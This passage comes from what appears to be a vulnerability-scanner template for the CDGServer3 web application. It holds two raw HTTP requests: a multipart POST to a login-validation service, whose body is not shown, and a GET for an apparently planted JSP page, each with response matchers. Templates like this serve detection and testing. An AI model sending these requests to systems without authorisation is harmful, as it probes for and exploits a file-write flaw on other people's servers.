      - |
        POST /CDGServer3/GetValidateLoginUserService HTTP/1.1
        Host: {{Hostname}}
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryMmx988TUuintqO4Q

        
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "FEPCCCLCENHIPOAFPAPDDFCGEAPNMDBMOJPMJAKKNPHOKIKIDCBPHEGKLDGNHCBDGELCPBEFEFDEHCPOFGCOAOOHOODLPJGKHCFBIMMNEPDGIDNEHKJBBIEGHBJEFEAPCFLLIDPECIOGJDEFLCNIGLCAENDABOFKBIJOEGEINBPOMNDHBABNLDGPJFJAKLBPDFBBMKGDLLHFMFOLGGLDBFCNLDIHEJFJGCPDLLMPIFAFLGCPAEAJEKKIGGCMIHHFGCFDGPEAFAGAGCGEFFCHCD"

  - raw:
      - |
        GET /CDGServer3/tdawo2aaa.jsp HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "12321"
